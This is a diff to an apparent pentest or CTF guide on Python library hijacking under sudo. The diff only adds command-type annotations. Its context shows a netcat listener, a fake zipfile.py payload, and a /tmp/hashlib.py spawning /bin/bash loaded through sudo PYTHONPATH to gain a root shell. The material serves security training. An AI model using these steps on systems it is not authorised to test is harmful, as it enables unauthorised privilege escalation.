@@ -16,6 +16,7 @@ When a Python script is executed with `sudo`, and the attacker controls either t
 
 Read the target script to find imported modules.
 
+<!-- cmd: python -->
 ```python
 # /home/meliodas/bak.py
 import os
@@ -29,6 +30,7 @@ def zipdir(path, ziph):
 
 Create a file named exactly like the imported module (e.g., `zipfile.py`) in the directory from which the script will be executed. Include the malicious payload in the global scope (so it executes immediately on import) and stub out any classes/functions the script expects to prevent it from crashing before our payload executes.
 
+<!-- cmd: python -->
 ```python
 # zipfile.py
 import os
@@ -60,6 +62,7 @@ class ZipFile:
 
 Set up a listener on your machine (`nc -lvnp 1337`), then run the script with `sudo` from the directory containing your malicious `zipfile.py`.
 
+<!-- cmd: linux -->
 ```bash
 sudo /usr/bin/python /home/meliodas/bak.py
 ```
@@ -70,12 +73,14 @@ The script imports your `zipfile.py` instead of the system `zipfile` module, exe
 
 If `sudo -l` shows `SETENV: NOPASSWD`, you can explicitly point Python's library path to a directory you control (like `/tmp`) by setting the `PYTHONPATH` variable in the `sudo` command.
 
+<!-- cmd: linux -->
 ```bash
 # In /tmp/hashlib.py
 import os
 os.system("/bin/bash")
 ```
 
+<!-- cmd: linux -->
 ```bash
 # Run the target script, forcing it to load libraries from /tmp
 sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/script/hasher.py
